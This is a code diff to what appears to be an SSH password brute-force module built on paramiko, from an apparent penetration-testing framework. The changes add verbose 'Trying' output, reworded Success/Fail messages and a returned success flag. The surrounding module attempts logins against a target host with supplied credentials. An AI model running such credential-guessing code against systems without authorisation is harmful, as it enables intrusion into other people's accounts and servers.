@@ -85,6 +85,7 @@ module_vars = {
 
 #This function does hte main exection of the brutefore method
 def run(username, password, target):
+    success = False
     verbose = module_vars['verbose']['Value']
     timeout = module_vars['timeout']['Value']
     port = module_vars['port']['Value']
@@ -95,15 +96,21 @@ def run(username, password, target):
         client = paramiko.SSHClient()
         if module_vars['allow-hosts']['Value']:  
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if verbose:
+            colors.PrintColor("INFO", "Trying " + attempt)
         client.connect(target, username=username, password=password, timeout=timeout, banner_timeout=banner_timeout, port=port)
         client.close()
-        colors.PrintColor("SUCCESS", "{} --> Authenticated".format(attempt))
+        colors.PrintColor("SUCCESS", "Success --> {}".format(attempt))
+        success = True
     except paramiko.AuthenticationException:
         if verbose:
-            colors.PrintColor("FAIL", "{} --> Authenticated".format(attempt))
+            colors.PrintColor("FAIL", "Fail --> {}".format(attempt))
     except paramiko.SSHException as sshException:
         if verbose:    
-            colors.PrintColor("FAIL", "{} --> Could not establish SSH connection".format(attempt))
+            colors.PrintColor("FAIL", "Fail --> {} Could not establish SSH connection".format(attempt))
     except Exception as e:
         if verbose:
-            colors.PrintColor("FAIL", "{} --> Error! {}".format(attempt,e))
+            colors.PrintColor("FAIL", "Fail --> {} Error! {}".format(attempt, e))
+    finally:
+        return success
+        
